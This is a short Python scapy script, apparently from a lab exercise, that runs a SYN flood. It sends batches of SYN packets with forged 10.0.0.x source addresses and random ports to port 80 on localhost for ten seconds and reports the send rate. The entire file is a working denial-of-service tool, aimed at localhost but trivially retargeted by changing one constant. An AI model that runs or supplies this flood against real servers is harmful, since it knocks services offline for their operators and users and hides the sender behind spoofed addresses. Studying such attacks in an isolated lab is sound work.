#!/usr/bin/env python3
"""
Attack 2: SYN Flood — VMware Edition
Sends SYN packets to port 80 (Apache) on localhost.
"""
from scapy.all import IP, TCP, send, RandShort, conf
import time

conf.verb = 0

TARGET      = "127.0.0.1"
TARGET_PORT = 80
DURATION    = 10
BATCH       = 500

print(f"""
╔══════════════════════════════════════╗
║           SYN FLOOD ATTACK           ║
║  Target  : {TARGET}:{TARGET_PORT:<20}║
║  Duration: {DURATION} seconds                ║
╚══════════════════════════════════════╝
""")

total = 0
start = time.time()

while time.time() - start < DURATION:
    pkts = [
        IP(src=f"10.0.0.{i%254+1}", dst=TARGET) /
        TCP(sport=RandShort(), dport=TARGET_PORT, flags="S")
        for i in range(BATCH)
    ]
    send(pkts, verbose=False)
    total += BATCH
    elapsed = time.time() - start
    print(f"  [{elapsed:>4.1f}s]  {total:>8,} SYN packets  "
          f"({total/elapsed:>6,.0f}/s)", end="\r")

print(f"\n\n  Done. Sent {total:,} SYN packets.\n")
